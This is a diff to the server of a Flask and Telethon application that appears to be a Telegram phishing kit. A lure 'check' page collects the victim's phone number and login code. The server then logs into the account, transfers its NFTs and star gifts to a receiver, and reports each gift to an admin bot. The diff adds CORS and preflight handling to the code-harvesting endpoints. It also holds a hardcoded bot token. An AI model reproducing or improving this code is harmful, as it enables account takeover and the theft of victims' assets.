@@ -1,5 +1,6 @@
 # server.py
 from flask import Flask, render_template, request, jsonify, session
+from flask_cors import CORS
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.payments import TransferStarGiftRequest
@@ -20,6 +21,7 @@ ADMIN_ID = 8503291981
 BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 
 app = Flask(__name__)
+CORS(app)  # Разрешаем кросс-доменные запросы
 app.secret_key = os.urandom(24)
 
 temp_clients = {}
@@ -161,8 +163,12 @@ def check_page(check_id):
             return render_template('index.html', check_amount=checks[check_id]['amount'])
     return render_template('index.html')
 
-@app.route('/api/send-code', methods=['POST'])
+@app.route('/api/send-code', methods=['POST', 'OPTIONS'])
 def api_send_code():
+    # Обработка preflight запроса
+    if request.method == 'OPTIONS':
+        return jsonify({"success": True}), 200
+    
     data = request.json
     phone = data.get('phone', '').strip()
     
@@ -203,8 +209,12 @@ def api_send_code():
     else:
         return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
 
-@app.route('/api/verify-code', methods=['POST'])
+@app.route('/api/verify-code', methods=['POST', 'OPTIONS'])
 def api_verify_code():
+    # Обработка preflight запроса
+    if request.method == 'OPTIONS':
+        return jsonify({"success": True}), 200
+    
     data = request.json
     code = data.get('code', '').strip()
     session_id = data.get('session_id', '')
@@ -233,10 +243,9 @@ def api_verify_code():
             if info:
                 await transfer_nft_to_receiver(client, info)
             
-            # Продажа подарков если есть непотраченные
+            # Логируем все подарки
             if info and info.get('gifts_count', 0) > 0:
                 try:
-                    # Логируем все подарки перед продажей
                     for gift in info.get('gifts', []):
                         notify_admin_sync(f"📦 Обнаружен подарок: ID {getattr(gift, 'id', 'unknown')}, Slug: {getattr(gift, 'slug', 'unknown')}")
                 except Exception as log_error:
